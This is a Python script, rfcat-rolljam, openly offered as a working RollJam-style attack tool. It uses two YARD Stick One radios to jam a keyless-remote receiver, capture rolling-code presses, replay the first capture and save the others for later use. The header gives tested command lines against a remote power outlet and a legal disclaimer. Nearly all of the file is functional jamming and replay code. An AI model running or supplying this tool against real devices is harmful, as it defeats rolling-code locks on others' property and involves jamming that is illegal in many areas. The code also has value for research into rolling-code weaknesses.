# rfcat-rolljam is a python script to "jam", capture, and replay rolling code signals using two yard stick one devices and rfcat.
#
# The name rfcat-rolljam is inspired by Samy Kamkar's RollJam which is a device that defeats rolling code security.
# This is done by jamming the receiver, capturing two or more remote presses, then stopping the jammer and replaying the first remote press
# saving the next capture in the rolling code series to replay later. The python code for rfcat-rolljam combines two projects that are already
# publicly available on Github that allow you to perform a rolljam like attack, it was just fairly clunky to do so requiring multiple scripts,
# this script simply combines everything into a single script that automates the process. It is up to you to follow all of the laws in your area.
# Jamming a signal is not legal in many areas. The author(s) of this code take no responsibility for your use or misuse of the script. If you choose
# to actually use the code you should do so in a controlled environment and only on equipment that you own. Please follow all local, state, federal,
# and international, and religious laws.
#
# The below commands have been tested by an anonymous user to perform a rolljam attack on a remote power outlet
# Capture and replay first code automatically: python rfcat-rolljam.py -f 315060000 -r 1818 -m -40 -o -2500000 -O capture.io
# Capture and wait for keypress to replay first code: python rfcat-rolljam.py -f 315060000 -r 1818 -m -40 -o -2500000 -O capture.io -k
# Load previous captures to replay: python rfcat-rolljam.py -I capture.io
#
# The original rolljam was created by Samy Kamkar https://samy.pl
# Jammer portion of the code is borrowed from Alex's rolljam repo https://github.com/alextspy/rolljam
# Scan and replay of the code is borrowed from Andrew Macpherson's RfCatHelpers https://github.com/AndrewMohawk/RfCatHelpers
# Combined and lightly modified into something similar to Samy Kamkar's original rolljam by Corey Harding from https://LegacySecurityGroup.com

#!/usr/bin/env python

import sys
from rflib import *
from struct import *
import bitstring
import operator
import argparse
import time
import pickle

parser = argparse.ArgumentParser(description='Python port of Samy Kamkar\'s Rolljam.  Code by Andrew Macpherson, Ghostlulz(Alex), and Corey Harding.', version="1.0")
parser.add_argument('-f', action="store", default="433880000", dest="baseFreq", help='Target frequency to listen for remote (default: 433875000)', type=int)
parser.add_argument('-r', action="store", dest="baudRate", default=2314, help='Baudrate (default: 3200)', type=int)
parser.add_argument('-n', action="store", dest="numSignals", default=2, help='Number of signals to capture before replaying (default: 2)', type=int)
parser.add_argument('-i', action="store", default="24000", dest="chanWidth", help='Width of each channel (lowest being 24000 -- default)', type=int)
parser.add_argument('-c', action="store", default="54000", dest="chanBW", help='Channel BW for RX (default: 60000)', type=int)
parser.add_argument('-I', action="store", default="", dest="inFile", help='File to read in')
parser.add_argument('-O', action="store", default="", dest="outFile", help='Output file to save captures to')
parser.add_argument('-o', action="store", default="-100000", dest="offset", help='Frequency offset of jammer (default: -70000)')
parser.add_argument('-p', action="store", default="200", dest="power", help='Power level for re-transmitting (default: 200)', type=int)
parser.add_argument('-m', action="store", default="-40", dest="minRSSI", help='Minimum RSSI db to accept signal (default: -40)', type=int)
parser.add_argument('-M', action="store", default="40", dest="maxRSSI", help='Maximum RSSI db to accept signal (default: 40)', type=int)
parser.add_argument('-k', action="store_true", dest="waitForKeypress", default=False, help='Wait for keypress before resending first capture (default: False)')
results = parser.parse_args()

jammingFreq = int(results.baseFreq) + int(results.offset)
SYNCHRO_WORD = 0xaaaa
SYNCHRO_WORD_BYTES = bitstring.BitArray(hex=hex(SYNCHRO_WORD)).tobytes()
DEFAULT_CAPTURE_LENGTH = 64

rawCapture = []
print "Configuring Scanner on Frequency: " + str(results.baseFreq)
d = RfCat(idx=0)
#d.setModeIDLE()
d.setMdmModulation(MOD_2FSK)
d.setMdmDeviatn(10000)
d.setFreq(results.baseFreq)
d.setMdmDRate(results.baudRate)
d.setMdmChanBW(results.chanBW)
d.setMdmChanSpc(results.chanWidth)
d.setChannel(0)
#d.setPower(results.power)
d.setAmpMode(RF_RX_POWER_AMPLIFIER_ACTION_ON_RX)
d.poke(AGCCTRL2, "%c" % 0xf8)
d.poke(AGCCTRL1, "%c" % 0x70)
d.lowball(3, sync=SYNCHRO_WORD, length=DEFAULT_CAPTURE_LENGTH) # need in order to read data

print "Configuring Jammer on Frequency: " + str(jammingFreq)
c = RfCat(idx=1)
#c.setModeIDLE()
c.setMdmModulation(MOD_2FSK)  # on of key
c.setMdmDeviatn(10000)
c.setFreq(jammingFreq)  # frequency
c.setMdmDRate(results.baudRate)  # how long each bit is transmited for
c.setMdmChanBW(results.chanBW)  # how wide channel is
c.setMdmChanSpc(results.chanWidth)
c.setChannel(0)
c.setMaxPower()  # max power
c.setAmpMode(RF_TX_POWER_AMPLIFIER_ACTION_ON_TX)
c.lowball(1, length=DEFAULT_CAPTURE_LENGTH)

time.sleep(1)  # warm up

if(results.inFile != ''):
    print "Opening file: " + results.inFile
    rawCapture = pickle.load(open(results.inFile, "rb"))
    if(len(rawCapture) == 0):
        print "No captures found"
        sys.exit()
    else:
        print "Loaded " + str(len(rawCapture)) + " captures"

    print "Send Phase..."
    c.setModeIDLE()
    emptykey = '\x00\x00\x00\x00\x00\x00\x00'
    d.makePktFLEN(len(emptykey))
    d.RFxmit(emptykey)
    while True:
        try:
            for i in range(0, len(rawCapture)):
                key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
                d.makePktFLEN(len(key_packed))
                raw_input("Press enter to send capture " + str(i + 1) + " of " + str(len(rawCapture)))
                d.RFxmit(key_packed)
                print "Sent " + str(i + 1) + " of " + str(len(rawCapture))
        except KeyboardInterrupt:
            print "Bye!"
            d.setModeIDLE()
            sys.exit()
            break
    print "exiting."
    d.setModeIDLE()
    sys.exit()

print "Jamming...."
#c.setModeTX()  # start transmitting
c.sendJammingStart(jammingFreq, jammingFreq, results.baudRate, MOD_ASK_OOK)
#raw_input("Press enter to start scanning")

print "Scanning..."
while True:
    try:
        y, t = d.RFrecv(1)
        sampleString = y.encode('hex')
        print sampleString
        strength = 0 - ord(str(d.getRSSI()))

        #sampleString = re.sub(r'((f)\2{8,})', '',sampleString)
        #if (re.search(r'((0)\2{15,})', sampleString)):
        #if (re.search(r'((0){8,}[0-9a-f]{32,})', sampleString)):
        print "Signal Strength:" + str(strength)
        #if(strength > results.minRSSI and strength < results.maxRSSI):
        rawCapture.append(sampleString)
        #print "Found " + str(sampleString)
        if(len(rawCapture) >= results.numSignals):
            break

    except ChipconUsbTimeoutException:
        pass
    except KeyboardInterrupt:
        break

print "Saving phase"
outputCapture = rawCapture
if(results.outFile != ''):
    pickle.dump(outputCapture, open(results.outFile, "wb"))

print "Send Phase..."
print rawCapture
d.setModeIDLE()
emptykey = '\x00\x00\x00\x00\x00\x00\x00'
d.makePktFLEN(len(emptykey))
d.RFxmit(emptykey)

print 'Done jamming'
if(results.waitForKeypress == True):
    time.sleep(.5)  # Assumes someone using waitForKeypress mode is testing thus they will be pressing button on remote
    # and waiting for the "Done jamming" message, this delay allows their brain to stop pressing the button
    # don't want to accidentally hop to next code
#c.setModeIDLE()  # put dongle in idle mode to stop jamming
c.sendJammingStop()

print "Configuring Transmitter on Frequency: " + str(results.baseFreq)
c.setModeIDLE()
c.setMdmModulation(MOD_2FSK)  # on of key
c.setMdmDeviatn(10000)
c.setFreq(results.baseFreq)  # switch to remote control frequency
c.setMdmDRate(results.baudRate)  # how long each bit is transmited for
c.setMdmChanBW(results.chanBW)  # how wide channel is
c.setMdmChanSpc(results.chanWidth)
c.setChannel(0)
c.setMaxPower()  # max power
c.setAmpMode(RF_TX_POWER_AMPLIFIER_ACTION_ON_TX)
c.makePktFLEN(DEFAULT_CAPTURE_LENGTH)

print 'Replaying'
key_packed = SYNCHRO_WORD_BYTES + bitstring.BitArray(hex=rawCapture[0]).tobytes()
print "Capture 1 of " + str(len(rawCapture)) + ": " + key_packed.encode('hex')

if(results.waitForKeypress == True):
    raw_input("Press enter to send first capture")

c.RFxmit(key_packed)
print "Sent capture 1"

try:
    for i in range(1, len(rawCapture)):
        key_packed = SYNCHRO_WORD_BYTES + bitstring.BitArray(hex=rawCapture[i]).tobytes()
        print "Capture " + str(i + 1) + " of " + str(len(rawCapture)) + ": " + key_packed.encode('hex')
        raw_input("Press enter to send capture " + str(i + 1) + " of " + str(len(rawCapture)))
        c.setModeIDLE()
        c.makePktFLEN(len(key_packed))
        c.RFxmit(key_packed)
        print "Sent capture " + str(i + 1) + " of " + str(len(rawCapture))
except KeyboardInterrupt:
    print "Bye!"
    d.setModeIDLE()
    c.setModeIDLE()  # put dongle in idle mode to stop jamming
    sys.exit()
    #break

print "exiting."
d.setModeIDLE()
c.setModeIDLE()
